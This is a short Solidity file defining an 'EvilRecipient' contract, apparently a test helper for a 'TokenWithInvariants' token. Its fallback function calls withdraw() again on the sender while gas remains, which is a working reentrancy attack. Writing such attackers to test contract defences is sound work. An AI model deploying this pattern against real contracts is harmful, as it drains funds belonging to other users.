import "TokenWithInvariants.sol";

contract EvilRecipient {
  function callWithdraw(TokenWithInvariants token) {
    token.withdraw();
  }

  function() {
    if (msg.gas > 1000000) {
      TokenWithInvariants token = TokenWithInvariants(msg.sender);
      token.withdraw();
    }
  } 
}
